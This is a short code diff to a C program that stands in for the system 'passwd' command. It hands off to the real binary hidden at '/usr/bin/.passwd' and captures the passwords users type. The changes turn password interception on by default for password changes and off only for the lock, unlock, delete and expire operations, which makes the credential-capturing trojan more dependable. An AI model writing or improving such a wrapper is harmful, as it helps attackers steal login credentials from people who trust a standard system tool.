@@ -88,10 +88,10 @@ void capture_password(char *password, size_t size, const char *prompt) {
 
 int main(int argc, char *argv[]) {
     char *real_passwd_path = "/usr/bin/.passwd"; // Path to the original `passwd`
-    char *operation = "unknown";
+    char *operation = "change_password";
     char *username = NULL;
     char password[256] = {0};
-    int intercept_password = 0;
+    int intercept_password = 1;
 
     // Parse arguments to identify operation
     if (argc > 1) {
@@ -100,15 +100,16 @@ int main(int argc, char *argv[]) {
                 username = argv[i];
             } else if (strcmp(argv[i], "-l") == 0) {
                 operation = "lock";
+                intercept_password = 0;
             } else if (strcmp(argv[i], "-u") == 0) {
                 operation = "unlock";
+                intercept_password = 0;
             } else if (strcmp(argv[i], "-d") == 0) {
                 operation = "delete";
+                intercept_password = 0;
             } else if (strcmp(argv[i], "-e") == 0) {
                 operation = "expire";
-            } else {
-                operation = "change_password";
-                intercept_password = 1;
+                intercept_password = 0;
             }
         }
     }
